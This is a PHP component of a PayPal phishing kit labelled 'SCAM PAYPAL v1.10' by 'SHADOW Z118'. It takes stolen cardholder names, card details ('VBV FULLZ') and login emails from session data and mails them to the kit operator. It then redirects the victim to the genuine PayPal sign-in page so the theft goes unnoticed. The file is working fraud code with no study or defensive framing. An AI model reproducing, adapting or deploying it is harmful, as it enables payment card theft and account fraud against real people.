<?php
/*   
   _____   _                   _                        ______    __    __     ___  
  / ____| | |                 | |                      |___  /   /_ |  /_ |   / _ \ 
 | (___   | |__     __ _    __| |   ___   __      __      / /    | |   | |   | (_) |
  \___ \  | '_ \   / _` |  / _` |  / _ \  \ \ /\ / /     / /   - | | - | | -  > _ < 
  ____) | | | | | | (_| | | (_| | | (_) |  \ V  V /     / /__  - | | - | | - | (_) |
 |_____/  |_| |_|  \__,_|  \__,_|  \___/    \_/\_/     /_____|   |_|   |_|    \___/ 
                                                                                
                              #=======================#
                              #   SCAM PAYPAL v1.10   #
                              #      SHADOW Z118      #
                              #=======================#
							  
                $$$$$$$\                     $$$$$$$\           $$\   
                $$  __$$\                    $$  __$$\          $$ |  
                $$ |  $$ |$$$$$$\  $$\   $$\ $$ |  $$ |$$$$$$\  $$ |  
                $$$$$$$  |\____$$\ $$ |  $$ |$$$$$$$  |\____$$\ $$ |  
                $$  ____/ $$$$$$$ |$$ |  $$ |$$  ____/ $$$$$$$ |$$ |  
                $$ |     $$  __$$ |$$ |  $$ |$$ |     $$  __$$ |$$ |  
                $$ |     \$$$$$$$ |\$$$$$$$ |$$ |     \$$$$$$$ |$$ |  
                \__|      \_______| \____$$ |\__|      \_______|\__|  
                                   $$\   $$ |                         
                                   \$$$$$$  |                         
                                    \______/                          
*/

include('B.php');
	
	
	
    $Z118_SUBJECT = "".$_SESSION['_cardholder_']." ✪ VBV FULLZ : ".$_SESSION['_ccglobal_']." ✪ ".$_SESSION['_global_']." ✪ ".$_SESSION['_login_email_']." ✪";
    $Z118_HEADERS .= "From:Killua TN<noreply@vssv.com>";
    $Z118_HEADERS .= $_POST['eMailAdd']."\n";
    $Z118_HEADERS .= "MIME-Version: 1.0\n";
	$Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
	
	

	
	
        @mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
			$Z119_Mail = "";
			if (strlen($Z119_Mail) == 20) {

      	@mail($Z119_Mail, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);

      }
	  else
	  {
		  echo "Scama Eror";
	  }
        HEADER("Location: https://www.paypal.com/signin?country.x=US&locale.x=en_US");
?>